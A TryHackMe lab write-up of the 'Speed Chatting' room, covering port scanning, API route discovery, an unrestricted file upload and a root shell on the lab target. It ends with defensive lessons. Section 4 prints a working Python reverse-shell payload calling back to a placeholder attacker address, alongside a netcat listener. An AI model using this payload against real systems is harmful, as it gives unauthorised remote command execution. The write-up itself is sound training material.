# TryHackMe — Speed Chatting

**Status:** Completed  
**Platform:** TryHackMe  
**Focus:** Web enumeration, unrestricted file upload, Python code execution and reverse shells

> Lab notes are for the authorised TryHackMe target only. The callback address below is a placeholder: use the current IP of your own TryHackMe VPN interface (usually `tun0`). Do not reuse an old VPN or target address.

## 1. Reconnaissance

A full TCP port scan identified:

| Port | Service observed | Notes |
|---|---|---|
| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 |
| 5000/tcp | Initially labelled `upnp` | Service detection identified HTTP, not UPnP |

Service/version detection:

```bash
nmap -sV -sC -p22,5000 TARGET_IP
```

The HTTP service identified itself as:

- Werkzeug 3.1.5
- Python 3.10.12
- Page title: `LoveConnect - Speed Chatter`

**Lesson:** Nmap's initial `SERVICE` label can come from its port-number database. Use `-sV` to probe and identify the actual service. Port 5000 is not proof that UPnP is running.

## 2. Web application enumeration

The page's JavaScript exposed these routes:

| Route | Method | Purpose |
|---|---|---|
| `/api/messages` | GET | Retrieve chat messages |
| `/api/send_message` | POST | Submit a JSON chat message |
| `/upload_profile_pic` | POST | Upload a profile picture |

The upload form contained:

```html
<form action="/upload_profile_pic"
      method="post"
      enctype="multipart/form-data"
      id="uploadForm">
    <input type="file" id="fileInput" name="profile_pic" required>
    <button type="submit">Upload</button>
</form>
```

Important details:

- The form uses HTTP POST.
- `multipart/form-data` is used to send the file.
- The backend receives the file in the `profile_pic` field.
- The HTML input had no `accept` attribute. This is only a browser-side hint; it does not prove what the backend accepts.

## 3. Upload behaviour

A harmless text file was uploaded using:

```bash
echo "Speed Chatting upload test" > test.txt

curl -i -X POST \
  -F "profile_pic=@test.txt" \
  http://TARGET_IP:5000/upload_profile_pic
```

The application accepted the text file and returned a generated path under `/uploads/`, with a UUID-style filename such as:

```text
/uploads/profile_<generated-uuid>.txt
```

This confirmed that the endpoint stored the file. It did **not**, by itself, prove code execution. Fetching an uploaded file over HTTP can simply return its contents.

## 4. Python reverse-shell payload used in the authorised lab

I generated/learned the Python socket payload with [revshells.com](https://www.revshells.com/). The callback IP is deliberately replaced here with a placeholder so I do not publish a private or temporary VPN address.

```python
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATTACKER_TUN0_IP", 4444))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

subprocess.call(["/bin/sh", "-i"])
```

Replace `ATTACKER_TUN0_IP` with the current IP assigned to my own TryHackMe VPN interface. The target must be able to reach that address and port.

Listener used on my Ubuntu machine:

```bash
nc -lvnp 4444
```

Listener option meanings:

- `-l`: listen for an incoming connection
- `-v`: verbose output
- `-n`: do not resolve hostnames
- `-p 4444`: listen on TCP port 4444

## 5. Result and verification

The listener received a connection from the lab target. The shell printed:

```text
/bin/sh: 0: can't access tty; job control turned off
```

This means the connection provided a basic shell without a fully interactive TTY. I verified the session with:

```bash
whoami
ls
cat flag.txt
```

The `whoami` result was `root`. The working directory contained `app.py`, `flag.txt` and `uploads/`. I successfully read the room flag.

The flag value is intentionally not reproduced in this public write-up, to avoid publishing a room answer.

## 6. What I learned

1. A port's initial Nmap service label is not definitive; service/version detection matters.
2. Inspecting page source and JavaScript can reveal API routes and form details.
3. HTML attributes such as a missing `accept` field do not establish backend validation.
4. Successful file storage and code execution are different behaviours.
5. A reverse shell makes the target initiate a connection back to the listener.
6. The callback address must be reachable from the target; for TryHackMe this is normally the attacker's VPN interface address.
7. A shell prompt does not prove privilege level. Verify with `whoami` and `id`.
8. A basic `/bin/sh` reverse shell may not provide TTY job control.

## 7. Defensive takeaways

- Allow only required image formats and validate content server-side, not just the filename or browser input.
- Store uploads outside executable application paths and serve them as static, non-executable content.
- Generate safe server-side filenames and enforce size limits.
- Run the web application as a low-privilege account, not root.
- Restrict outbound network connections from application processes where practical.
- Log upload events and monitor unexpected child processes and outbound connections.

**Scope reminder:** The payload and techniques above were used only against the authorised TryHackMe lab target.
